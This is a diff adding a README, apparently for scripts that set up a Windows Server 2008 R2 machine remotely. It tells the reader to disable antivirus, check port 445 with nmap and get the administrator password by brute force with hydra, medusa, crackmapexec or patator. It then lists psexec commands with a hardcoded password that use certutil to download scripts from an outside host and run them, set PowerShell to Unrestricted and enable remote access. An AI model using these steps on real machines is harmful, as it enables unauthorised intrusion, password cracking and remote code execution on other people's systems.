@@ -1,0 +1,78 @@
+# Adjust Windows 2008 R2 Desktop
+
+This Scripts are Made for Initial Adjustment of a Windows Server 2008 R2 Machine from Command Prompt.
+
+## Requirements
+
+#### On Source Computer
+
+- Chocolatey Packet Manager;
+
+- nmap.exe (port Scanner);
+
+- Microsoft Sysinternals;
+
+- Local or Virtual Network Access to Target Machine;
+
+#### On Target Computer
+
+- Pure Installation of the Microsoft Windows Server 2008 R2 Operation System;
+
+- Internet Access;
+
+### To be Sure
+
+To Be Sure that Turn off your Antivirus on Source and Target Computer!
+
+To Be Sure that Port 445/tcp is Opened on Target Computer (nmap).
+
+## Run Commands:
+
+### Template of command
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h команда
+
+The String "\\192.168.252.47" is a Computer Name, the String "Администратор" is a login, the String "0A9s8d7F" is a password, the String "C:\Users\Администратор\" is a Home Folder in this Page. Change this if any Difference is Found.
+
+This Data (except of login and password) you can retrieve with nmap.exe command (See Instructions in the Internet).
+
+You can retrieve the login and password in a Kali Linux Operation System with Brutforce Programs hydra, medusa, crackmapexec and patator.
+
+#### 1. Run msft-KB4012598
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h certutil.exe -urlcache -f http://file.netip4.ru:80/PROGS/Microsoft/KB4012598/WSH/msft-KB4012598-run-w61.cmd C:\Users\Администратор\msft-KB4012598-run-00.cmd
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd.exe /c C:\Users\Администратор\msft-KB4012598-run-00.cmd
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cscript.exe //NoLogo C:\Users\Администратор\KB4012598-Download.wsf
+
+#### 2. Run Windows Adjust
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.001.cmd
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.002.cmd
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.003.cmd
+
+( next for Windows 6.1 only )
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h powershell.exe -NoLogo -NoProfile -Command "Set-ExecutionPolicy -ExecutionPolicy Unrestricted"
+
+( next for Server only )
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.005.cmd
+
+( next for all Windows )
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.006.cmd
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.007.b.cmd
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd /c c:\.BIN\smbshare\LNK\postinstall.008.cmd
+
+#### 3. Run Remote Enable
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h certutil.exe -urlcache -f http://file.netip4.ru:80/PROGS/NIT/RemoteOpen/nit-remoteenable-run-w61.cmd C:\Users\Администратор\nit-remoteenable-run-00.cmd
+
+psexec.exe \\192.168.252.47 /u Администратор /p 0A9s8d7F /i /h cmd.exe /c C:\Users\Администратор\nit-remoteenable-run-00.cmd
+
